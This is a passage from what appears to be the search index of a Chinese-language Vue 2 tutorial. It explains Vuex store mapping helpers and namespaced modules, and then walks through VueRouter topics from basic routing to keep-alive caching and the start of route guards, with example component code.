this.$store.dispatch('jian', this.n) }, incrementOdd() { this.$store.dispatch('jiaOdd', this.n) }, incrementWait() { this.$store.dispatch('jiaWait', this.n) }, }, computed: { ...mapState({ sum: 'sum', school: 'school', subject: 'subject' }), ...mapGetters({ bigSum: 'bigSum' }), } } </script> \",\"效果：\",\"Vuex06.png\"]},{\"header\":\"6.3 mapActions与mapMutations\",\"slug\":\"_6-3-mapactions与mapmutations\",\"contents\":[\"mapActions用于将 Vuex store 的 actions 映射到组件的方法中，可以简化在组件中触发 Vuex store actions 的代码：\",\"methods:{ //靠mapActions生成：incrementOdd、incrementWait（对象形式） ...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'}) //靠mapActions生成：incrementOdd、incrementWait（数组形式） ...mapActions(['jiaOdd','jiaWait']) } \",\"mapMutations用于将 Vuex store 的 mutations 映射到组件的方法中，可以简化在组件中提交 Vuex store mutations 的代码：\",\"methods:{ //靠mapActions生成：increment、decrement（对象形式） ...mapMutations({increment:'JIA',decrement:'JIAN'}), //靠mapMutations生成：JIA、JIAN（对象形式） ...mapMutations(['JIA','JIAN']), } \",\"注意：mapActions 与 mapMutations 使用时，若需要传递参数，则需要在模板中绑定事件时传递好参数，否则参数是事件对象\"]},{\"header\":\"6.4 mapActions与mapMutations代码演示\",\"slug\":\"_6-4-mapactions与mapmutations代码演示\",\"contents\":[\"src/store/index.js\",\"import Vue from 'vue' //引入Vue核心库 import Vuex from 'vuex' // 引入Vuex Vue.use(Vuex) // 应用Vuex插件 // 准备actions对象——用于响应组件中的动作 // 包含多个方法: 触发mutation调用, 间接更新state // 一个方法就是一个action // action中可以有逻辑代码和异步代码 // action由组件来触发调用: this.$store.dispatch('actionName') const actions = { jiaOdd(context, value) { if (context.state.sum % 2) { context.commit('JIA', value) } }, jiaWait(context, value) { setTimeout(() => { context.commit('JIA', value) }, 500) }, } // 准备mutations对象——用于操作数据（即修改state中的数据） // 包含多个方法: 能直接更新state // 一个方法就是一个mutation // mutation只能包含更新state的同步代码, 也不会有逻辑 // mutation由action触发调用: commit('mutationName') const mutations = { JIA(state, value) { state.sum += value }, JIAN(state, value) { state.sum -= value }, } // 准备state对象——用于存储数据 //state 对象 //类似于data const state = { sum: 0, school: 'QFNU', subject: '前端', } // 准备getters——用于将state中的数据进行加工 const getters = { bigSum(state) { return state.sum * 10 }, } // 创建并暴露store export default new Vuex.Store({ actions, mutations, state, getters, }) \",\"src/components/Count.vue\",\"<template> <div> <h2>当前求和为：{{ sum }}</h2> <h3>当前求和放大10倍为:{{ bigSum }}</h3> <h3>我在{{ school }}，学习{{ subject }}</h3> <select v-model.number=\\\"n\\\"> <!-- 这里的.number是指令修饰符，将输入的数据转换为数字 --> <option value=\\\"1\\\">1</option> <option value=\\\"2\\\">2</option> <option value=\\\"3\\\">3</option> </select> <!-- 这里要注意传参 --> <button @click=\\\"increment(n)\\\">+</button> <button @click=\\\"decrement(n)\\\">-</button> <button @click=\\\"incrementOdd(n)\\\">当前求和为奇数时再加</button> <button @click=\\\"incrementWait(n)\\\">等一等再加</button> </div> </template> <script> import { mapState, mapGetters, mapMutations,mapActions } from 'vuex' export default { name: 'Count', data() { return { n: 1,//用户选择的数字 } }, methods: { ...mapMutations({ increment: 'JIA', decrement: 'JIAN' }), ...mapActions({ incrementOdd: 'jiaOdd', incrementWait: 'jiaWait' }) }, computed: { ...mapState({ sum: 'sum', school: 'school', subject: 'subject' }), ...mapGetters({ bigSum: 'bigSum' }), } } </script> \"]},{\"header\":\"7. 多组件共享数据\",\"slug\":\"_7-多组件共享数据\",\"contents\":[\"案例演示：\",\"src/App.vue\",\"<template> <div> <Count/><hr/> <Person/> </div> </template> <script> import Count from \\\"./components/Count.vue\\\" import Person from \\\"./components/Person.vue\\\" export default { name: \\\"App\\\", components: { Count, Person }, } </script> \",\"src/store/index.js 该文件用于创建 Vuex 中最为核心的 store\",\"import Vue from 'vue' import Vuex from 'vuex' Vue.use(Vuex) const actions = { jiaOdd(context,value){ console.log('actions中的jiaOdd被调用了') if(context.state.sum % 2){ context.commit('JIA',value) } }, jiaWait(context,value){ console.log('actions中的jiaWait被调用了') setTimeout(()=>{ context.commit('JIA',value) },500) } } //准备mutations——用于操作数据（state） const mutations = { JIA(state,value){ console.log('mutations中的JIA被调用了') state.sum += value }, JIAN(state,value){ console.log('mutations中的JIAN被调用了') state.sum -= value }, ADD_PERSON(state,value){ console.log('mutations中的ADD_PERSON被调用了') state.personList.unshift(value) } } //准备state——用于存储数据 const state = { sum: 0, school: 'QFNU', subject: '前端', personList: [] } //准备getters——用于将state中的数据进行加工 const getters = { bigSum(state){ return state.sum*10 } } //创建并暴露store export default new Vuex.Store({ actions, mutations, state, getters }) \",\"src/components/Count.vue\",\"<template> <div> <h1>当前求和为：{{ sum }}</h1> <h3>当前求和放大10倍为：{{ bigSum }}</h3> <h3>我在{{ school }}，学习{{ subject }}</h3> <h3 style=\\\"color:red\\\">Person组件的总人数是：{{ personList.length }}</h3> <select v-model.number=\\\"n\\\"> <option value=\\\"1\\\">1</option> <option value=\\\"2\\\">2</option> <option value=\\\"3\\\">3</option> </select> <button @click=\\\"increment(n)\\\">+</button> <button @click=\\\"decrement(n)\\\">-</button> <button @click=\\\"incrementOdd(n)\\\">当前求和为奇数再加</button> <button @click=\\\"incrementWait(n)\\\">等一等再加</button> </div> </template> <script> import {mapState,mapGetters,mapMutations,mapActions} from 'vuex' export default { name:'Count', data() { return { n:1, //用户选择的数字 } }, computed:{ ...mapState(['sum','school','subject','personList']), ...mapGetters(['bigSum']) }, methods: { ...mapMutations({increment:'JIA',decrement:'JIAN'}), ...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'}) } } </script> <style lang=\\\"css\\\">button{margin-left: 5px;}</style> \",\"src/components/Person.vue\",\"<template> <div> <h1>人员列表</h1> <h3 style=\\\"color:red\\\">Count组件求和为：{{ sum }}</h3> <input type=\\\"text\\\" placeholder=\\\"请输入名字\\\" v-model=\\\"name\\\"> <button @click=\\\"add\\\">添加</button> <ul> <li v-for=\\\"p in personList\\\" :key=\\\"p.id\\\">{{ p.name }}</li> </ul> </div> </template> <script> import {nanoid} from 'nanoid' import { mapState } from \\\"vuex\\\" export default { name:'Person', data() { return { name:'' } }, computed:{ personList(){return this.$store.state.personList}, sum(){return this.$store.state.sum} }, methods: { add(){ if (this.name === \\\"\\\") return const personObj = {id:nanoid(),name:this.name} this.$store.commit('ADD_PERSON',personObj) this.name = '' } }, } </script> \",\"效果：\",\"Vuex07.gif\"]},{\"header\":\"8. 模块化编程\",\"slug\":\"_8-模块化编程\",\"contents\":[\"目的：让代码更好维护，让多种数据分类更加明确\"]},{\"header\":\"8.1 剥离到单文件\",\"slug\":\"_8-1-剥离到单文件\",\"contents\":[\"修改 store.js，为了解决不同模块命名冲突的问题，将不同模块的命名空间开启 namespaced: true，之后在不同页面中引入 getter、actions、mutations 时，需要加上所属的模块名\",\"const countAbout = { namespaced: true, // 开启命名空间 state: {x:1}, mutations: { ... }, actions: { ... }, getters: { bigSum(state){ return state.sum * 10 } } } const personAbout = { namespaced: true, // 开启命名空间 state: { ... }, mutations: { ... }, actions: { ... } } const store = new Vuex.Store({ modules: { countAbout, personAbout } }) \",\"开启命名空间后，组件中读取 state 数据\",\"// 方式一：自己直接读取 this.$store.state.personAbout.list // 方式二：借助mapState读取： ...mapState('countAbout',['sum','school','subject']), \",\"开启命名空间后，组件中读取 getters 数据\",\"//方式一：自己直接读取 this.$store.getters['personAbout/firstPersonName'] //方式二：借助mapGetters读取： ...mapGetters('countAbout',['bigSum']) \",\"开启命名空间后，组件中调用 dispatch\",\"//方式一：自己直接dispatch this.$store.dispatch('personAbout/addPersonWang',person) //方式二：借助mapActions： ...mapActions('countAbout',{incrementOdd:'jiaOdd',incrementWait:'jiaWait'}) \",\"开启命名空间后，组件中调用 commit\",\"//方式一：自己直接commit this.$store.commit('personAbout/ADD_PERSON',person) //方式二：借助mapMutations： ...mapMutations('countAbout',{increment:'JIA',decrement:'JIAN'}), \"]},{\"header\":\"8.2 剥离到多个文件\",\"slug\":\"_8-2-剥离到多个文件\",\"contents\":[\"xxx.js\",\"export default{ namespaced:true, actions:{}, mutations:{}, state:{}, getters:{} } \",\"index.js\",\"import xxx1 from '@/store/xxx.js'; import xxx2 from '@/store/xxx.js'; import Vue from 'vue'; import Vuex from 'vuex'; Vue.use(Vuex); export default new Vuex.Store({ modules:{ xxx1, xxx2 } }); \"]}]},\"/front-end/vue-notes/23-VueRouter.html\":{\"title\":\"VueRouter\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/23-VueRouter\"]},{\"header\":\"1. 相关理解\",\"slug\":\"_1-相关理解\",\"contents\":[]},{\"header\":\"1.1 vue-router的理解\",\"slug\":\"_1-1-vue-router的理解\",\"contents\":[\"Vue 的一个插件库，专门用来实现 SPA 应用\"]},{\"header\":\"1.2 对SPA应用的理解\",\"slug\":\"_1-2-对spa应用的理解\",\"contents\":[\"单页 Web 应用（single page web application，SPA）\",\"整个应用只有一个完整的页面\",\"点击页面中的导航链接不会刷新页面，只会做页面的局部更新\",\"数据需要通过 Ajax 请求获取\"]},{\"header\":\"1.3 路由的理解\",\"slug\":\"_1-3-路由的理解\",\"contents\":[\"什么是路由?\",\"一个路由就是一组映射关系（key - value）\",\"key 为路径，value 可能是 function 或 component\",\"路由分类：\",\"后端路由 \",\"理解：value 是 function，用于处理客户端提交的请求\",\"工作过程：服务器接收到一个请求时，根据请求路径找到匹配的函数来处理请求，返回响应数据\",\"前端路由 \",\"理解：value 是 component，用于展示页面内容\",\"工作过程：当浏览器的路径改变时，对应的组件就会显示\"]},{\"header\":\"2. 安装VueRouter\",\"slug\":\"_2-安装vuerouter\",\"contents\":[\"安装 VueRouter，命令 npm i vue-router，如果是 Vue 2，则 npm i vue-router@3\"]},{\"header\":\"3. 基本路由\",\"slug\":\"_3-基本路由\",\"contents\":[\"使用步骤：\",\"应用 VueRouter 插件\",\"编写路由组件\",\"编写其他组件\",\"编写 router 入口文件：创建 router 实例对象，编写路由规则\",\"编写应用的根组件 \",\"router-link 标签：实现路由切换\",\"router-view 标签：指定路由组件的展示位置\"]},{\"header\":\"3.1 应用VueRouter插件\",\"slug\":\"_3-1-应用vuerouter插件\",\"contents\":[\"在 src 目录下 main.js 项目主入口文件，编写如下代码来应用 VueRouter 插件，注册路由器对象（router）\",\"main.js\",\"//引入Vue import Vue from 'vue' //引入App import App from './App.vue' //引入VueRouter import VueRouter from 'vue-router' //引入路由器（不写文件名，就默认找router目录下的index.js） import router from './router' //关闭Vue的生产提示 Vue.config.productionTip = false //应用插件 Vue.use(VueRouter) //创建vm //通过 router 配置参数注入路由 // 从而让整个应用都有路由功能 new Vue({ el:'#app', render: h => h(App), router:router }) \"]},{\"header\":\"3.2 编写路由组件\",\"slug\":\"_3-2-编写路由组件\",\"contents\":[\"src/pages/About.vue\",\"<template> <h2>我是About的内容</h2> </template> <script> export default { name: 'About' } </script> \",\"src/pages/Home.vue\",\"<template> <h2>我是Home的内容</h2> </template> <script> export default { name: 'Home' } </script> \"]},{\"header\":\"3.3 编写其他组件\",\"slug\":\"_3-3-编写其他组件\",\"contents\":[\"src/components/Banner.vue\",\"<template> <div> <h2>Vue Router Demo</h2> </div> </template> <script> export default { name: 'Banner' } </script> \"]},{\"header\":\"3.4 编写router入口文件\",\"slug\":\"_3-4-编写router入口文件\",\"contents\":[\"在 src 目录下创建 router 文件夹，在 router 文件夹中创建 index.js（叫该名称的文件，引入的时候可以写到 router 文件夹，而不用写文件名，叫其他名称的话，要写到文件名），创建 router 实例对象，编写路由规则\",\"src/router/index.js\",\"import VueRouter from 'vue-router' // 引入VueRouter import About from '../pages/About' // 路由组件 import Home from '../pages/Home' // 路由组件 // 创建router实例对象，去管理一组一组的路由规则 const router = new VueRouter({ routes: [ { path: '/about', component: About, }, { path: '/home', component: Home, }, ], }) //暴露router export default router \"]},{\"header\":\"3.5 编写应用的根组件\",\"slug\":\"_3-5-编写应用的根组件\",\"contents\":[\"实现路由切换：<router-link></router-link>，并指定路由组件的展示位置：<router-view></router-view>\",\"src/App.vue\",\"<template> <div> <Banner></Banner> <!-- 原始html中我们使用a标签实现页面的跳转 --> <!-- <a href=\\\"./about.html\\\">About</a> --> <!-- <a href=\\\"./home.html\\\">Home</a> --> <!-- Vue中借助router-link标签实现路由的切换 --> <router-link to=\\\"/about\\\">About</router-link> <br> <router-link to=\\\"/home\\\">Home</router-link> <!-- 指定组件的呈现位置 --> <router-view></router-view> </div> </template> <script> import Banner from './components/Banner' export default { name: 'App', components: { Banner } } </script> \",\"效果：\",\"VueRouter01.gif\"]},{\"header\":\"3.6 注意\",\"slug\":\"_3-6-注意\",\"contents\":[\"路由组件通常存放在 pages 文件夹中，一般组件通常存放在 components 文件夹中\",\"通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载\",\"每个组件都有自己的 $route 属性，里面存储着自己的路由信息\",\"整个应用只有一个 router，可以通过组件的 $router 属性获取到\"]},{\"header\":\"4. 嵌套（多级）路由\",\"slug\":\"_4-嵌套-多级-路由\",\"contents\":[\"配置路由规则，使用 children 配置项\",\"routes:[ { path:'/about', component:About, }, { path:'/home', component:Home, children:[ // 通过children配置子级路由 { path:'news', // 此处一定不要带斜杠，写成 /news component:News }, { path:'message', // 此处一定不要写成 /message component:Message } ] } ] \",\"跳转（要写完整路径）\",\"<router-link to=\\\"/home/news\\\">News</router-link> \",\"将上述案例添加嵌套路由\",\"src/router/index.js\",\"import VueRouter from 'vue-router' // 引入VueRouter import About from '../pages/About' // 路由组件 import Home from '../pages/Home' // 路由组件 import News from '../pages/News' // 路由组件 import Message from '../pages/Message' // 路由组件 // 创建router实例对象，去管理一组一组的路由规则 const router = new VueRouter({ routes: [ { path: '/about', component: About, }, { path: '/home', component: Home, children: [ //通过children配置子级路由 { // path: 'news' // 简化写法，此处一定不要带斜杠 path: '/home/news', //完整写法 component: News, }, { path: 'message', // 简化写法 component: Message, }, ], }, ], }) //暴露router export default router \",\"添加两个子路由\",\"src/pages/News.vue\",\"<template> <ul> <li v-for=\\\"(news, index) in newsArr\\\" :key=\\\"index\\\">{{ news }}</li> </ul> </template> <script> export default { name:'News', data() { return { newsArr: [\\\"news001\\\", \\\"news002\\\", \\\"news003\\\", \\\"news004\\\"], } }, } </script> \",\"src/pages/Message.vue\",\"<template> <ul> <li v-for=\\\"message in messages\\\" :key=\\\"message.id\\\"> <a href=\\\"#\\\">{{ message.title }}</a> </li> </ul> </template> <script> export default { name:'Message', data() { return { messages: [], }; }, mounted() { //模拟Ajax请求从后台获取数据 setTimeout(() => { const messages = [ { id: 1, title: \\\"message001\\\", }, { id: 2, title: \\\"message002\\\", }, { id: 3, title: \\\"message003\\\", }, ] this.messages = messages; }, 1000) }, } </script> \",\"src/pages/Home.vue\",\"<template> <div> <h2>我是Home的内容</h2> <div> <router-link to=\\\"/home/news\\\">News</router-link> <br> <router-link to=\\\"/home/message\\\">Message</router-link> <div> <router-view></router-view> </div> </div> </div> </template> <script> export default { name: 'Home' } </script> \",\"效果：\",\"VueRouter02.gif\"]},{\"header\":\"5. 命名路由\",\"slug\":\"_5-命名路由\",\"contents\":[\"作用：可以简化路由的跳转\",\"给路由命名：\",\"{ path:'/demo', component:Demo, children:[ { path:'test', component:Test, children:[ { name:'hello' // 给路由命名 path:'welcome', component:Hello, } ] } ] } \",\"简化跳转：\",\"<!--简化前，需要写完整的路径 --> <router-link to=\\\"/demo/test/welcome\\\">跳转</router-link> <!--简化后，直接通过名字跳转 --> <router-link :to=\\\"{name:'hello'}\\\">跳转</router-link> \",\"例： 将上述案例中 News 组件跳转简化，命名为xinwen\",\"src/router/index.js\",\"import VueRouter from 'vue-router' // 引入VueRouter import About from '../pages/About' // 路由组件 import Home from '../pages/Home' // 路由组件 import News from '../pages/News' // 路由组件 import Message from '../pages/Message' // 路由组件 // 创建router实例对象，去管理一组一组的路由规则 const router = new VueRouter({ routes: [ { path: '/about', component: About, }, { path: '/home', component: Home, children: [ //通过children配置子级路由 { // path: 'news' // 简化写法，此处一定不要带斜杠 path: '/home/news', //完整写法 name: 'xinwen', //给路由命名 component: News, }, { path: 'message', // 简化写法 component: Message, }, ], }, ], }) //暴露router export default router \",\"src/pages/Home.vue\",\"<template> <div> <h2>我是Home的内容</h2> <div> <router-link :to=\\\"{ name: 'xinwen' }\\\">News</router-link> <br> <router-link to=\\\"/home/message\\\">Message</router-link> <div> <router-view></router-view> </div> </div> </div> </template> <script> export default { name: 'Home' } </script> \"]},{\"header\":\"6. 向路由组件传递数据（路由传参）\",\"slug\":\"_6-向路由组件传递数据-路由传参\",\"contents\":[]},{\"header\":\"6.1 路由的query参数\",\"slug\":\"_6-1-路由的query参数\",\"contents\":[\"传递参数：\",\"<!-- 跳转并携带query参数，to的字符串写法 --> <router-link :to=\\\"`/home/message/detail?id=${message.id}&title=${message.title}`\\\">{{message.title}}</router-link> <!-- 跳转并携带query参数，to的对象写法（推荐） --> <router-link :to=\\\"{ path:'/home/message/detail', query:{ id: message.id, title: message.title } }\\\" >{{message.title}}</router-link> \",\"接收参数：\",\"$route.query.id $route.query.title \",\"例： 我们在 Message 组件下展示一个 Detail 组件\",\"src/pages/Message.vue\",\"<template> <div> <ul> <li v-for=\\\"message in messages\\\" :key=\\\"message.id\\\"> <!-- 跳转路由并携带query参数，to的字符串写法 --> <!-- <router-link :to=\\\"`/home/message/detail?id=${message.id}&title=${message.title}`\\\">{{ message.title }}</router-link> --> <!-- 跳转路由并携带query参数，to的字符串写法 --> <router-link :to=\\\"{ path: '/home/message/detail', query: { id: message.id, title: message.title, } }\\\">{{ message.title }}</router-link> </li> </ul> <hr> <router-view></router-view> </div> </template> <script> export default { name:'Message', data() { return { messages: [], } }, mounted() { //模拟Ajax请求从后台获取数据 setTimeout(() => { const messages = [ { id: 1, title: \\\"message001\\\", }, { id: 2, title: \\\"message002\\\", }, { id: 3, title: \\\"message003\\\", }, ] this.messages = messages; }, 1000) }, } </script> <style></style> \",\"src/pages/Detail.vue\",\"<template> <div> <ul> <li>消息编号：{{ $route.query.id }}</li> <li>消息标题：{{ $route.query.title }}</li> </ul> </div> </template> <script> export default { name: 'Detail' } </script> \",\"src/router/index.js\",\"import VueRouter from 'vue-router' // 引入VueRouter import About from '../pages/About' // 路由组件 import Home from '../pages/Home' // 路由组件 import News from '../pages/News' // 路由组件 import Message from '../pages/Message' // 路由组件 import Detail from '../pages/Detail' // 路由组件 // 创建router实例对象，去管理一组一组的路由规则 const router = new VueRouter({ routes: [ { path: '/about', component: About, }, { path: '/home', component: Home, children: [ //通过children配置子级路由 { // path: 'news' // 简化写法，此处一定不要带斜杠 path: '/home/news', //完整写法 name: 'xinwen', //给路由命名 component: News, }, { path: 'message', // 简化写法 component: Message, children: [ { path: 'detail', component: Detail, }, ], }, ], }, ], }) //暴露router export default router \",\"效果：\",\"VueRouter03.gif\"]},{\"header\":\"6.2 路由的params参数\",\"slug\":\"_6-2-路由的params参数\",\"contents\":[\"配置路由，声明接收 params 参数：\",\"{ path:'/home', component:Home, children:[ { path:'news', name: 'xinwen', //给路由命名 component:News }, { component:Message, children:[ { name:'xiangqing',//命名路由 path:'detail/:id/:title', // 使用占位符声明接收params参数 component:Detail } ] } ] } \",\"传递参数，特别注意：路由携带 params 参数时，若使用 to 的对象写法，则不能使用 path 配置项，必须使用 name 配置！\",\"<!-- 跳转并携带params参数，to的字符串写法 --> <router-link :to=\\\"/home/message/detail/${message.id}/${message.title}\\\">跳转</router-link> <!-- 跳转并携带params参数，to的对象写法 --> <router-link :to=\\\"{ name:'xiangqing', params: { id: message.id, title: message.title, } }\\\" >跳转</router-link> \",\"接收参数：\",\"$route.params.id $route.params.title \",\"例：我们使用 params 参数传递实现上面的案例\",\"src/pages/Message.vue\",\"<template> <div> <ul> <li v-for=\\\"message in messages\\\" :key=\\\"message.id\\\"> <!-- 跳转路由并携带params参数，to的字符串写法 --> <router-link :to=\\\"`/home/message/detail/${message.id}/${message.title}`\\\">{{ message.title }}</router-link> <!-- 跳转路由并携带params参数，to的对象写法 --> <!-- <router-link :to=\\\"{ //path:'/home/message/detail',//这里不能用path，应该用命名路由 name:'xiangqing', params: { id: message.id, title: message.title, } } \\\">{{ message.title }}</router-link> --> </li> </ul> <hr> <router-view></router-view> </div> </template> <script> export default { name:'Message', data() { return { messages: [], } }, mounted() { //模拟Ajax请求从后台获取数据 setTimeout(() => { const messages = [ { id: 1, title: \\\"message001\\\", }, { id: 2, title: \\\"message002\\\", }, { id: 3, title: \\\"message003\\\", }, ] this.messages = messages; }, 1000) }, } </script> \",\"src/pages/Detail.vue\",\"<template> <div> <ul> <li>消息编号：{{ $route.params.id }}</li> <li>消息标题：{{ $route.params.title }}</li> </ul> </div> </template> <script> export default { name: 'Detail' } </script> \",\"src/router/index.js\",\"import VueRouter from 'vue-router' // 引入VueRouter import About from '../pages/About' // 路由组件 import Home from '../pages/Home' // 路由组件 import News from '../pages/News' // 路由组件 import Message from '../pages/Message' // 路由组件 import Detail from '../pages/Detail' // 路由组件 // 创建router实例对象，去管理一组一组的路由规则 const router = new VueRouter({ routes: [ { path: '/about', component: About, }, { path: '/home', component: Home, children: [ //通过children配置子级路由 { // path: 'news' // 简化写法，此处一定不要带斜杠 path: '/home/news', //完整写法 name: 'xinwen', //给路由命名 component: News, }, { path: 'message', // 简化写法 component: Message, children: [ { path: 'detail/:id/:title', //使用占位符声明接收params参数 name:'xiangqing',//命名路由 component: Detail, }, ], }, ], }, ], }) //暴露router export default router \",\"效果：\",\"VueRouter04.gif\"]},{\"header\":\"6.3 路由的props配置\",\"slug\":\"_6-3-路由的props配置\",\"contents\":[\"props 作用：让路由组件更方便的收到参数\",\"{ name:'xiangqing', path:'detail',//注意此处参数，传递query和params参数时不一样 component:Detail, //第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件 // props:{a:900} //第二种写法：props值为布尔值，为true时，则把路由收到的所有params参数通过props传给Detail组件 // props:true //第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件 props($route){ return { id: $route.query.id, title: $route.query.title } } } \",\"接收：\",\"props['参数1','参数2',……] \",\"例：将上述案例使用 props 配置的第三种方法传递query参数\",\"src/router/index.js\",\"import VueRouter from 'vue-router' // 引入VueRouter import About from '../pages/About' // 路由组件 import Home from '../pages/Home' // 路由组件 import News from '../pages/News' // 路由组件 import Message from '../pages/Message' // 路由组件 import Detail from '../pages/Detail' // 路由组件 // 创建router实例对象，去管理一组一组的路由规则 const router = new VueRouter({ routes: [ { path: '/about', component: About, }, { path: '/home', component: Home, children: [ //通过children配置子级路由 { // path: 'news' // 简化写法，此处一定不要带斜杠 path: '/home/news', //完整写法 name: 'xinwen', //给路由命名 component: News, }, { path: 'message', // 简化写法 component: Message, children: [ { path: 'detail', name: 'xiangqing', //命名路由 component: Detail, //第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件 // props:{a:900} //第二种写法：props值为布尔值，为true时，则把路由收到的所有params参数通过props传给Detail组件 // props:true //第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件 props($route) { return { id: $route.query.id, title: $route.query.title, } }, }, ], }, ], }, ], }) //暴露router export default router \",\"src/pages/Detail.vue\",\"<template> <div> <ul> <li>消息编号：{{ id }}</li> <li>消息标题：{{ title }}</li> </ul> </div> </template> <script> export default { name: 'Detail', props: ['id', 'title'] } </script> \",\"src/pages/Message.vue\",\"<template> <div> <ul> <li v-for=\\\"message in messages\\\" :key=\\\"message.id\\\"> <router-link :to=\\\"{ name: 'xiangqing', query: { id: message.id, title: message.title } }\\\">{{ message.title }}</router-link> </li> </ul> <hr> <router-view></router-view> </div> </template> <script> export default { name:'Message', data() { return { messages: [], }; }, mounted() { //模拟Ajax请求从后台获取数据 setTimeout(() => { const messages = [ { id: 1, title: \\\"message001\\\", }, { id: 2, title: \\\"message002\\\", }, { id: 3, title: \\\"message003\\\", }, ] this.messages = messages; }, 1000) }, } </script> \"]},{\"header\":\"7. 路由跳转的replace方法\",\"slug\":\"_7-路由跳转的replace方法\",\"contents\":[\"作用：控制路由跳转时操作浏览器历史记录的模式\",\"浏览器的历史记录有两种写入方式：push 和 replace\",\"push 是追加历史记录\",\"replace 是替换当前记录，路由跳转时候默认为 push 方式\",\"开启 replace 模式，<router-link :replace=\\\"true\\\" ...>News</router-link> 简写 <router-link replace ...>News</router-link>\",\"总结：浏览记录本质是一个栈，默认 push，点开新页面就会在栈顶追加一个地址，后退，栈顶指针向下移动，改为 replace 就是不追加，而将栈顶地址替换\",\"例： 我们将上面的案例改为 replace 方式\",\"src/pages/Home.vue\",\"<template> <div> <h2>我是Home的内容</h2> <div> <router-link replace :to=\\\"{ name: 'xinwen' }\\\">News</router-link> <br> <router-link replace to=\\\"/home/message\\\">Message</router-link> <div> <router-view></router-view> </div> </div> </div> </template> <script> export default { name: 'Home' } </script> \"]},{\"header\":\"8. 编程式路由导航\",\"slug\":\"_8-编程式路由导航\",\"contents\":[\"作用：不借助 <router-link> 实现路由跳转，让路由跳转更加灵活\",\"相关 API：\",\"this.$router.push({})：内传的对象与 <router-link> 中的 to 相同，相当于点击路由链接（可以返回到当前路由界面）\",\"this.$router.replace({})：用新路由替换当前路由（不可以返回到当前路由界面）\",\"this.$router.forward()：前进\",\"this.$router.back()：后退\",\"this.$router.go(n) 可前进也可后退，n 为正数前进，n 为负数后退\",\"例：我们将上面的例子添加编程式路由导航\",\"src/pages/Message.vue\",\"<template> <div> <ul> <li v-for=\\\"message in messages\\\" :key=\\\"message.id\\\"> <router-link :to=\\\"{ name: 'xiangqing', query: { id: message.id, title: message.title } }\\\">{{ message.title }}</router-link> <button @click=\\\"showPush(message)\\\">push查看</button> <button @click=\\\"showReplace(message)\\\">replace查看</button> </li> </ul> <hr> <router-view></router-view> </div> </template> <script> export default { name:'Message', data() { return { messages: [], }; }, mounted() { //模拟Ajax请求从后台获取数据 setTimeout(() => { const messages = [ { id: 1, title: \\\"message001\\\", }, { id: 2, title: \\\"message002\\\", }, { id: 3, title: \\\"message003\\\", }, ] this.messages = messages; }, 1000) }, methods: { showPush(message) { this.$router.push({ name: 'xiangqing', query: { id: message.id, title: message.title } }) }, showReplace(message) { this.$router.replace({ name: 'xiangqing', query: { id: message.id, title: message.title } }) } } } </script> \",\"效果：\",\"VueRouter05.gif\"]},{\"header\":\"9. 缓存路由组件\",\"slug\":\"_9-缓存路由组件\",\"contents\":[\"作用：让不展示的路由组件保持挂载，不被销毁\",\"<keep-alive include=\\\"News\\\"><router-view></router-view></keep-alive>\",\"<keep-alive :include=\\\"['News','Message']\\\"><router-view></router-view></keep-alive>\",\"// 缓存一个路由组件 <keep-alive include=\\\"News\\\"> // include中写想要缓存的组件名，不写表示全部缓存 <router-view></router-view> </keep-alive> // 缓存多个路由组件 <keep-alive :include=\\\"['News','Message']\\\"> <router-view></router-view> </keep-alive> \",\"例：我们将上述案例中 news 后面增加一个输入框，当我们跳转到其它界面再回来时里面的输入内容会消失，使用缓存组件可以解决该问题\",\"src/pages/News.vue\",\"<template> <ul> <li v-for=\\\"(news, index) in newsArr\\\" :key=\\\"index\\\">{{ news }} <input type=\\\"text\\\"> </li> </ul> </template> <script> export default { name:'News', data() { return { newsArr: [\\\"news001\\\", \\\"news002\\\", \\\"news003\\\", \\\"news004\\\"], } }, } </script> \",\"src/pages/Home.vue\",\"<template> <div> <h2>我是Home的内容</h2> <div> <router-link replace :to=\\\"{ name: 'xinwen' }\\\">News</router-link> <br> <router-link replace to=\\\"/home/message\\\">Message</router-link> <div> <keep-alive include=\\\"News\\\"> <router-view></router-view> </keep-alive> </div> </div> </div> </template> <script> export default { name: 'Home' } </script> \",\"效果：\",\"VueRouter06.gif\"]},{\"header\":\"10. activated与deactivated生命周期钩子\",\"slug\":\"_10-activated与deactivated生命周期钩子\",\"contents\":[\"activated 和 deactivated 是路由组件所独有的两个生命周期钩子，用于捕获路由组件的激活状态\",\"具体使用：\",\"activated 路由组件被激活时触发\",\"deactivated 路由组件失活时触发\",\"例：我们在上面案例中 news 上面添加一个动态的“欢迎学习Vue”\",\"src/pages/News.vue\",\"<template> <ul> <li :style=\\\"{ opacity }\\\">欢迎学习Vue</li> <li v-for=\\\"(news, index) in newsArr\\\" :key=\\\"index\\\">{{ news }} <input type=\\\"text\\\"> </li> </ul> </template> <script> export default { name: 'News', data() { return { newsArr: [\\\"news001\\\", \\\"news002\\\", \\\"news003\\\", \\\"news004\\\"], opacity: 1, } }, activated() { console.log('News组件被激活了') this.timer = setInterval(() => { this.opacity -= 0.01 if (this.opacity <= 0) this.opacity = 1 }, 16) }, deactivated() { console.log('News组件失活了') clearInterval(this.timer) } } </script> \",\"效果：\",\"VueRouter07.gif\"]},{\"header\":\"11. 路由守卫\",\"slug\":\"_11-路由守卫\",\"contents\":[\"作用：对路由进行权限控制\",\"分类：全局守卫、独享守卫、组件内守卫\"]},{\"header\":\"11.1 全局路由守卫\",\"slug\":\"_11-1-全局路由守卫\",\"contents\":[\"例：我们给上述案例添加全局路由守卫，当 localStorage 中 school 为 QFNU 时才可以访问新闻和消息界面，同时我们切换组件时标题发生改变\",\"src/router/index.js\",\"import VueRouter from 'vue-router' // 引入VueRouter import About from '../pages/About' // 路由组件 import Home from '../pages/Home' // 路由组件 import News from '../pages/News' // 路由组件 import Message from '../pages/Message' // 路由组件 import Detail from '../pages/Detail' // 路由组件 // 创建router实例对象，去管理一组一组的路由规则 const router = new VueRouter({ routes: [ { path: '/about', component: About, meta: { title: '关于' }, }, { path: '/home', component: 